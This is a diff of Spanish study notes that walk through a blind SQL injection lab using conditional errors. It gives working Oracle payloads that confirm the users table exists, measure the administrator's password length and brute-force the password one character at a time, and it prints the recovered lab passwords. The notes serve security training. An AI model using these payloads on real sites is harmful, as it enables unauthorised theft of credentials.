@@ -163,7 +163,7 @@ Necesitariamos que esto fuese 1=1 , obviamente como no sabemos la passwordadmini
 y la subcadena sería de los payloads de arriba pero con password, por lo que la cadena total quedaría algo así.
 
 ```bash
-' and (select substring('password',1,1) from users where username='administrator')='a'--
+' and (select substring(password,1,1) from users where username='administrator')='a'--
 ```
 
 En intruder tendremos que hacer dos tipos de ataque.
@@ -226,3 +226,169 @@ Esto ya tiene mejor pinta
 ehfs7kn1ms4epn95kfv5
 
 ![](2022-07-07-20-17-31.png)
+
+
+
+## Lab: Blind SQL injection with conditional errors
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+- valor enviado por cookie
+- es blind , si el sql causa error devuelve un mensaje
+- tabla users , username y passowrd
+- obtener administrator password
+
+![](2022-07-08-11-16-38.png)
+
+
+>NOTA: Estos ejercicios se pueden hacer casi directamente pero la intención de esta guía es que me sirva de metodología para cualquier caso. Una vez acabe los laboratorios actualizaré mi metodología para que funcione con los diferentes tipos de ejercicios.
+
+Este tipo de sql inyection no te das cuenta hasta que estás haciendo las consultas, por eso es necesario ir haciendo las pruebas tanto el que sabemos que si existe la respuesta como el que no.
+
+### 1. Vamos a ver si la base de datos existe y si es explotable.
+
+[v] ```     ' AND '1'='1--```  --> Devuelve 200 y ningún mensaje. por lo que puede ser blind y puede ser que necesite condicionales, aún no lo sabemos.
+
+[v] ```     ' AND '2'='1--```  --> Devuelve 200 por lo que al no mostrar nada y ser una sentencia falsa estamos ante un tipo que necesitamos errores condicionales
+
+### 2. Conditional errors sql injection
+
+You can test a single boolean condition and trigger a database error if the condition is true.
+
+```sql
+
+Oracle     
+
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+
+Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+
+PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
+
+MySQL	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+```
+
+Como vemos a la estructura donde queremos llegar, cada base de datos es de "su padre y de su madre"
+
+Empezamos por la orcle, esta será sencilla de saber si no vale porque necesita el from dual
+
+
+
+
+**probando oracle** -->  Nos devuelve 200 para la primera condición que es la falsa y 500 para la verdadera. hemos probado oracle porque es la primera que salía y vemos que funciona, por lo que no seguimos probando otras.
+
+```sql
+
+' union (select case when (1=1) then to_char(1/0) else '' end from dual)--
+
+'+union+(SELECT+CASE+WHEN+(2%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)--    --> 200 falsa
+
+'+union+(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)--    --> 500 verdadera
+```
+
+Ahora ya podemos hacer la condición que queramos y temerlo donde está la condición 1=1
+
+## Vamos a comprobar que la tabla users existe
+
+Podemos usar (select 'x' from users LIMIT 1) o mejor aún probamos la misma consulta anterior pero en vez de comprobar en dual comprobamos en users.
+
+Hay que tener cuidado porque tenemos que usar la misma que nos devolvía 200 (la condicion1=2) y cambiar dual por users
+
+' union (select case when (1=2) then to_char(1/0) else '' end from users)--  --> **devuelve 200 por lo que existe users**
+
+## comprobar que existe administrator
+
+(select username from users where username='administrator')='administrator'--
+
+básicamente la vamos a añadir dentro del select, pero ya sabemos que si existe el usuario nos devolverá error 500 y si no error 200. Importante comprobar un usuario que nos devuelva 200 (error) para comprobar que no nos hemos equivocado en la sistasis.
+
+```bash
+' union (select case when ((select username from users where username='administrator')='administrator') then to_char(1/0) else '' end from users)-- 
+```
+
+   1. con nombre falso
+
+      ![](2022-07-08-12-40-56.png)
+
+   2. Con nombre que existe administrator
+
+      ![](2022-07-08-12-41-37.png)
+
+### 5. Obtener la clave
+
+Una vez que tenemos el usuario y la tabla ya podemos realizar el ataque para saber la contraseña.
+
+La lógica es :
+   1. Obtener el tamaño de la cadena
+   2. ir haciendo pruebas alfanumericas (como nos dice el ejercicio), una vez que encontremos el 1º caracter vamos al segundo y así.
+
+## 6. Obtener el tamaño de la contraseña 
+Con esto conseguimos saber el tamaño, tenemos que mandarlo a intruder pero añadiendolo a nuestra consulta principal porque sino no veríamos ningun cambio , devolvería siempre 200.
+
+```sql 
+-- Para saber el tamño
+(select username from users where username='administrator' and LENGTH(password)>0)='administrator'
+
+-- Nuestra consulta funcional
+
+' union (select case when ((select username from users where username='administrator')='administrator') then to_char(1/0) else '' end from users)-- 
+
+-- Consulta  que mandaremos al intruder
+
+' union (select case when ((select username from users where username='administrator' and LENGTH(password)>0)='administrator') then to_char(1/0) else '' end from users)-- 
+
+```
+
+
+Antes de mandarlo voy a hacer una prueba con password >0 eso es verdad por lo que la condición sería 1 por lo que el resultado sería 
+
+![](2022-07-08-12-53-10.png)
+
+Luego probaré una consulta con password> 1000 sería falso por lo que la condición and haría que fuese falso por lo que el resultado sería 200
+
+![](2022-07-08-12-54-01.png)
+
+Ahora ya podemos mandarlo y ver que tamaño será.
+
+Sería un snipper normal
+
+![](2022-07-08-12-55-18.png)
+
+Tiene 20 caracteres porque el cambio de respuesta de 500 a 200 está ahí y la condición es que sea mayor
+
+![](2022-07-08-12-56-20.png)
+
+## 7. Obtener la contraseña
+
+La contraseña se consigue con este tipo de select haciendo un iterador hasta el tamaño y luego un bruteforce de caracteres alfanuméricos por lo menos aquí en el laboratorio. Se podrían hacer más potentes.
+
+```sql
+
+-- Select para usar en el ataque
+' and (select substring(password,1,1) from users where username='administrator')='a'
+
+
+---Nuestra cadena funcional
+
+
+' union select case when (1=1) then to_char(1/0) else '' end from users-- 
+
+'+union+select+case+when+(1%3d2)+then+to_char(1/0)+else+''+end+from+users+WhERE+username='administrator'+and+substr(password,1,1)%3d'a' --
+
+Lo hemos hecho de la otra manera porque al dar siempre 
+
+Ahora cambiamos por el 1=1
+```
+
+![](2022-07-08-14-48-11.png)
+
+awh1rah1ldpr6tzk32rt
+
+
+![](2022-07-08-14-52-13.png)
